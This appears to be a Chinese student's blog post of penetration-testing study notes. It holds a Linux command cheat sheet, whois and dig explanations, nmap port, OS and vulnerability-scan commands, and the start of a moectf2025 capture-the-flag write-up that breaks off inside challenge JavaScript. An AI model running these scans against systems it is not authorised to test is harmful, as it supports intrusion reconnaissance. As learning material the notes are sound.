@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="渗透之路身为一个网安生我感觉渗透应该是必学的，所以从现在开始我开始我的渗透之路了。 计算机基础linuxlinux命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透学习">
+<meta property="og:url" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="网络幻影">
+<meta property="og:description" content="渗透之路身为一个网安生我感觉渗透应该是必学的，所以从现在开始我开始我的渗透之路了。 计算机基础linuxlinux命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A01.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A03.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A012.1.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/5.1.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.1.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.2.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.4.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.3.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.5.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.6.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.7.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.0.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.1.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.2.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.3.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.4.png">
+<meta property="og:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.5.png">
+<meta property="article:published_time" content="2025-07-29T02:30:15.000Z">
+<meta property="article:modified_time" content="2025-09-23T14:32:32.900Z">
+<meta property="article:author" content="linkpwn">
+<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A01.png">
+
+<link rel="canonical" href="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>渗透学习 | 网络幻影</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">网络幻影</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <a>
+        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          渗透学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-07-29 10:30:15" itemprop="dateCreated datePublished" datetime="2025-07-29T10:30:15+08:00">2025-07-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-09-23 22:32:32" itemprop="dateModified" datetime="2025-09-23T22:32:32+08:00">2025-09-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">渗透学习</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="渗透之路"><a href="#渗透之路" class="headerlink" title="渗透之路"></a>渗透之路</h1><p>身为一个网安生我感觉渗透应该是必学的，所以从现在开始我开始我的渗透之路了。</p>
+<h2 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h4 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">ls                                                           //列出当前目录中的文件和子目录</span><br><span class="line">pwd                                                          //显示当前工作目录的路径</span><br><span class="line">cd /path/to/directory                                        //切换工作目录</span><br><span class="line">mkdir directory_name                                         //创建新目录</span><br><span class="line">rmdir directory_name                                         //删除空目录</span><br><span class="line">rm file_name                                                 //删除文件或目录</span><br><span class="line">rm -r directory_name                                         //递归删除目录及其内容</span><br><span class="line">cp source_file destination                                   //复制文件或目录</span><br><span class="line">cp -r source_directory destination                           //递归复制目录及其内容</span><br><span class="line">mv old_name new_name                                         //移动或重命名文件或目录</span><br><span class="line">touch file_name                                              //创建空文件或更新文件的时间戳</span><br><span class="line">cat file_name                                                //连接和显示文件内容</span><br><span class="line">more/less                                                    //逐页显示文本文件内容</span><br><span class="line">head/tail(head -n 10 file_name  # 显示文件的前10行)           //显示文件的前几行或后几行</span><br><span class="line">grep search_term file_name                                   //在文件中搜索指定文本</span><br><span class="line">ps aux                                                       //显示当前运行的进程</span><br><span class="line">kill process_id                                              //终止进程</span><br><span class="line">ifconfig/ip(ip addr show)                                    //查看和配置网络接口信息</span><br><span class="line">ping host_name_or_ip                                         //测试与主机的连通性</span><br><span class="line">wget/curl(wget URL/curl -O URL)                              //从网络下载文件</span><br><span class="line">chown owner:group file_name                                  //修改文件或目录的所有者</span><br><span class="line">tar -czvf archive.tar.gz directory_name                      //压缩目录</span><br><span class="line">tar -xzvf archive.tar.gz                                     //解压文件</span><br><span class="line">df -h                                                        //显示磁盘空间使用情</span><br><span class="line">du -h directory_name                                         //显示目录的磁盘使用情况</span><br><span class="line">mount /dev/sdX1 /mnt                                         //挂载分区到指定目录</span><br><span class="line">umount /mnt                                                  //卸载挂载的文件系统</span><br><span class="line">psql -U username -d database_name                            //连接到PostgreSQL数据库</span><br><span class="line">mysql -u username -p                                         //连接到MySQL数据库</span><br><span class="line">top/htop                                                     //显示系统资源的实时使用情况和进程信息</span><br><span class="line">ssh username@remote_host                                     //远程登录到其他计算机</span><br><span class="line">scp local_file remote_user@remote_host:/remote/directory     //安全地将文件从本地复制到远程主机，或从远程主机复制到本地</span><br><span class="line">find /path/to/search -name &quot;file_pattern&quot;                    //在文件系统中查找文件和目录</span><br><span class="line">grep -r &quot;pattern&quot; /path/to/search                            //在文本中搜索匹配的行，并可以使用正则表达式进行高级搜索</span><br><span class="line">sed &#x27;s/old_text/new_text/&#x27; file_name                         //流编辑器，用于文本处理和替换</span><br><span class="line">awk &#x27;&#123;print $1&#125;&#x27; file_name                                   //提取文件中的第一列数据</span><br><span class="line">ssh-keygen -t rsa                                            //生成SSH密钥对，用于身份验证远程服务器</span><br><span class="line">date                                                         //显示或设置系统日期和时间</span><br><span class="line">echo                                                         //将文本输出到标准输出</span><br><span class="line">ln source_file link_name                                     //创建硬链接</span><br><span class="line">ln -s source_file link_name                                  //创建符号链接</span><br><span class="line">uname -a                                                     //显示系统信息</span><br><span class="line">shutdown/reboot                                              //关闭或重新启动系统</span><br><span class="line">who/w                                                        //显示当前登录的用户信息</span><br><span class="line">curl -X GET http://exampe.com                                //用于与网络资源进行交互，支持各种协议</span><br><span class="line">zip archive.zip file1 file2                                  //压缩文件</span><br><span class="line">unzip archive.zip                                            //解压ZIP文件</span><br><span class="line">chmod permissions file_name                                  //修改文件权限</span><br><span class="line">chown owner:group file_name                                  //修改文件所有者</span><br><span class="line">useradd new_user                                             //添加用户</span><br><span class="line">userdel username                                             //删除用户</span><br><span class="line">passwd                                                       //更改用户密码</span><br><span class="line">crontab -e                                                   //编辑用户的定时任务</span><br><span class="line">uptime                                                       //显示系统的运行时间和负载情况</span><br><span class="line">hostname                                                     //显示或设置计算机的主机名</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT                //允许HTTP流量(用于配置防火墙规则)</span><br><span class="line">ufw enable                                                   //启用Uncomplicated Firewall(用于配置防火墙规则)</span><br><span class="line">netstat -tuln                                                //显示所有TCP和UDP端口</span><br><span class="line">ss -tuln                                                     //使用Socket Stat查看网络连接</span><br><span class="line">ps aux                                                       //显示所有进程</span><br><span class="line">top                                                          //实时监视系统资源</span><br><span class="line">htop                                                         //更友好的进程监视器</span><br><span class="line">history                                                      //查看命令历史记录</span><br><span class="line">free -m                                                      //以MB为单位显示内存使用情况</span><br><span class="line">lsblk                                                        //显示块设备信息</span><br><span class="line">fdisk /dev/sdX                                               //打开磁盘分区工具</span><br><span class="line">nc -vz host_name_or_ip port                                  //测试主机的端口是否可达</span><br><span class="line">stat file_or_directory                                       //显示文件或目录的详细信息</span><br><span class="line">nmcli connection show                                        //显示网络连接信息</span><br><span class="line">tailf file_name                                              //实时追踪文件的末尾，类似于tail -f</span><br><span class="line">scp local_file remote_user@remote_host:/remote/directory     //从本地到远程</span><br><span class="line">scp remote_user@remote_host:/remote/file local_directory     //从远程到本地</span><br><span class="line">rsync                                                        //用于在本地和远程系统之间同步文件和目录</span><br><span class="line">例：rsync -avz source_directory/ remote_user@remote_host:/remote/directory/</span><br><span class="line">dd if=input_file of=output_file bs=block_size                //用于复制和转换文件</span><br><span class="line">sudo                                                         //以超级用户权限运行命令</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="kali-linux进行渗透测试"><a href="#kali-linux进行渗透测试" class="headerlink" title="kali linux进行渗透测试"></a>kali linux进行渗透测试</h4><h5 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h5><h6 id="信息收集（Reconnaissance）"><a href="#信息收集（Reconnaissance）" class="headerlink" title="信息收集（Reconnaissance）"></a>信息收集（Reconnaissance）</h6><p>使用Whois查询域名信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois example.com</span><br></pre></td></tr></table></figure>
+
+<p>WHOIS 查询能获取哪些信息:</p>
+<p>查询返回的信息会因顶级域名和注册商的不同而有所差异，但通常包含以下内容：</p>
+<ol>
+<li><strong>域名状态：</strong> 如 <code>ok</code> (正常), <code>clientHold</code> (注册商暂停解析), <code>serverHold</code> (注册局暂停解析), <code>pendingDelete</code> (等待删除) 等。这反映了域名的当前管理状态。</li>
+<li><strong>注册人信息：</strong><ul>
+<li>注册人姓名&#x2F;组织名称。</li>
+<li>注册人联系地址。</li>
+<li>注册人联系电话。</li>
+<li>注册人联系邮箱。</li>
+<li><strong>(重要变化)</strong> 由于隐私法规（如 GDPR），现在公开显示的注册人信息通常是<strong>注册商提供的隐私保护服务</strong>的联系信息，而不是真实的注册人信息。</li>
+</ul>
+</li>
+<li><strong>管理联系人信息：</strong> 负责管理域名事宜的联系人信息（同样常受隐私保护）。</li>
+<li><strong>技术联系人信息：</strong> 负责处理域名技术问题（如 DNS）的联系人信息（同样常受隐私保护）。</li>
+<li><strong>注册商信息：</strong><ul>
+<li>注册商名称。</li>
+<li>注册商官方网站。</li>
+<li>注册商 WHOIS 服务器地址。</li>
+<li>注册商提供的支持联系方式。</li>
+</ul>
+</li>
+<li><strong>重要日期：</strong><ul>
+<li><strong>创建日期：</strong> 域名首次注册的日期。</li>
+<li><strong>到期日期：</strong> 域名注册的有效截止日期。在此日期后未续费，域名可能会被删除并重新开放注册。</li>
+<li><strong>更新日期：</strong> 域名信息（如联系信息或 DNS 设置）最后一次更新的日期。</li>
+</ul>
+</li>
+<li><strong>域名服务器：</strong><ul>
+<li>主域名服务器地址。</li>
+<li>辅域名服务器地址。这些服务器存储了该域名对应的 DNS 记录（如 A, MX, CNAME 记录）。</li>
+</ul>
+</li>
+<li><strong>授权服务器：</strong> 有时会列出提供该域名权威 WHOIS 数据的服务器地址。</li>
+</ol>
+<p>使用Dig进行DNS查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig [@server] [options] [name] [type]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>[@server]</code> (可选):</strong> 指定要查询的 DNS 服务器的 IP 地址或主机名。如果省略，则使用系统 <code>/etc/resolv.conf</code> 文件中配置的 DNS 服务器。<ul>
+<li>示例：<code>dig @8.8.8.8 example.com</code></li>
+</ul>
+</li>
+<li><strong><code>[options]</code> (可选):</strong> 控制 <code>dig</code> 行为和输出的各种选项，以 <code>+</code> 开头。<ul>
+<li>常用选项：<ul>
+<li><code>+short</code>: 只显示最精简的答案（通常是 IP 地址或目标域名）。</li>
+<li><code>+noall</code>: 关闭所有输出部分（通常与 <code>+answer</code> 等组合使用）。</li>
+<li><code>+answer</code>: <strong>只显示答案部分</strong> (最常用！)。</li>
+<li><code>+stats</code>: 显示查询统计信息（耗时、大小等）。</li>
+<li><code>+trace</code>: 模拟 DNS 递归解析的完整过程，从根域名服务器开始追踪。</li>
+<li><code>+nocmd</code>: 不显示最初的命令和版本信息行。</li>
+<li><code>+nocomments</code>: 不显示注释行。</li>
+<li><code>+tcp</code>: 强制使用 TCP 协议进行查询（默认使用 UDP，在响应过大或需要区域传输时 TCP 是必需的）。</li>
+<li><code>-x</code>: 进行反向 DNS 查询（根据 IP 查找域名），此时 <code>[name]</code> 应为 IP 地址，<code>[type]</code> 通常省略或为 <code>PTR</code>。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>[name]</code> (通常需要):</strong> 要查询的域名（如 <code>example.com</code>, <code>www.google.com</code>) 或 IP 地址（当使用 <code>-x</code> 时）。</li>
+<li><strong><code>[type]</code> (可选):</strong> 指定要查询的 DNS 记录类型。如果省略，默认为查询 <code>A</code> 记录。常见类型：<code>A</code>, <code>AAAA</code>, <code>MX</code>, <code>CNAME</code>, <code>NS</code>, <code>TXT</code>, <code>SOA</code>, <code>PTR</code>, <code>ANY</code>（查询所有记录，但通常被服务器限制或拒绝）。<ul>
+<li>示例：<code>dig example.com MX</code>, <code>dig example.com NS</code></li>
+</ul>
+</li>
+</ul>
+<p><code>dig</code> 是 DNS 领域无可争议的瑞士军刀。它通过提供<strong>详细、可控、原始</strong>的 DNS 查询响应，使你能够：</p>
+<ul>
+<li>精确查询<strong>任何类型</strong>的 DNS 记录。</li>
+<li>指定向<strong>任何 DNS 服务器</strong>发送查询。</li>
+<li><strong>深入诊断</strong>各种 DNS 解析问题。</li>
+<li><strong>验证</strong> DNS 配置更改。</li>
+<li><strong>理解</strong> DNS 协议交互的底层细节。</li>
+</ul>
+<p>Nmap的使用</p>
+<h3 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a><strong>核心功能</strong></h3><ol>
+<li><strong>端口扫描</strong><ul>
+<li><code>-sS</code>：TCP SYN 扫描（默认，需 root）</li>
+<li><code>-sT</code>：TCP 全连接扫描（无需 root）</li>
+<li><code>-sU</code>：UDP 扫描（需 sudo）</li>
+<li><code>-p</code>：指定端口（<code>-p 80,443</code> 或 <code>-p-</code> 全端口）</li>
+</ul>
+</li>
+<li><strong>服务识别</strong><ul>
+<li><code>-sV</code>：探测服务版本</li>
+</ul>
+</li>
+<li><strong>操作系统探测</strong><ul>
+<li><code>-O</code>：猜测目标 OS</li>
+</ul>
+</li>
+<li><strong>主机发现</strong><ul>
+<li><code>-sn</code>：Ping 扫描（不扫端口）</li>
+</ul>
+</li>
+<li><strong>脚本引擎（NSE）</strong><ul>
+<li><code>--script=&lt;脚本&gt;</code>：如 <code>vuln</code>（漏洞检测）、<code>http-title</code>（网页标题</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 基础扫描：SYN + 服务版本</span><br><span class="line">sudo nmap -sS -sV target_ip</span><br><span class="line"></span><br><span class="line"># 快速扫描：仅常用端口</span><br><span class="line">nmap -F target_ip</span><br><span class="line"></span><br><span class="line"># 全端口扫描 + OS 探测</span><br><span class="line">sudo nmap -p- -O target_ip</span><br><span class="line"></span><br><span class="line"># UDP 关键端口扫描</span><br><span class="line">sudo nmap -sU -p 53,67,161 target_ip</span><br><span class="line"></span><br><span class="line"># 漏洞检测（NSE）</span><br><span class="line">sudo nmap --script=vuln target_ip</span><br></pre></td></tr></table></figure>
+
+<p>感觉这样只学理论感觉不太行，以后的边练边学。</p>
+<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>moectf2025</p>
+<h3 id="第一章-神秘的手镯"><a href="#第一章-神秘的手镯" class="headerlink" title="第一章 神秘的手镯"></a>第一章 神秘的手镯</h3><p>F12在源码中找到flag</p>
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A01.png" alt="1"></p>
+<h3 id="第三章-问剑石！篡天改命！"><a href="#第三章-问剑石！篡天改命！" class="headerlink" title="第三章 问剑石！篡天改命！"></a>第三章 问剑石！篡天改命！</h3><p>F12查看源码看到flag的逻辑</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testTalent</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/test_talent?level=B&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">manifestation</span>: <span class="string">&#x27;none&#x27;</span> &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">textContent</span> = data.<span class="property">result</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 显示/隐藏光芒效果</span></span><br><span class="line">            <span class="keyword">const</span> glow = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;glow&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">result</span>.<span class="title function_">includes</span>(<span class="string">&#x27;流云状青芒&#x27;</span>)) &#123;</span><br><span class="line">                glow.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                glow.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">flag</span>) &#123;</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">`✨ 天道机缘：<span class="subst">$&#123;data.flag&#125;</span> ✨\n\n天赋篡天术大成！`</span>);</span><br><span class="line">                &#125;, <span class="number">500</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) 